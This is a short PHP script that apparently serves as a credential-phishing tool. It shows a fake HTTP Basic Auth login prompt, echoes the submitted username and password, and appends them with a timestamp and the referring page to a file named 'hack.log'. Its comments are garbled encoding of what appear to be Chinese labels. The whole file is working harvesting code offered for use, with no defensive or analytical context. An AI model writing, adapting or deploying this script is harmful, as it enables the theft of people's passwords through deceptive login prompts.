<?php
error_reporting(0);  
///////////http��֤////////////  
if(!isset($_SERVER['PHP_AUTH_USER']))  
{  
    header('WWW-Authenticate: Basic realm="login:"');  
    header('HTTP/1.0 401 Unauthorized');  
    echo 'login failed!';  
    exit;  
}  
else  
{  
echo $_SERVER['PHP_AUTH_USER'].'<br>';  
echo $_SERVER['PHP_AUTH_PW'].'<br>';  
}  
///////////�ж���·ҳ��/////////////  
echo $_SERVER["HTTP_REFERER"];  
///////////д��¼//////////////////////  
$file='hack.log';  
$con="username:".$_SERVER['PHP_AUTH_USER']."\r\npassword:".$_SERVER['PHP_AUTH_PW']."\r\ntime:".date("H:i:s")."\r\n".$_SERVER["HTTP_REFERER"]."\r\n-----------------------------------------------\r\n";  
if(file_put_contents($file,$con,FILE_APPEND))echo date("H:i:s")."<br>success!<br>";  
  
////////////////////////////////////  
?>  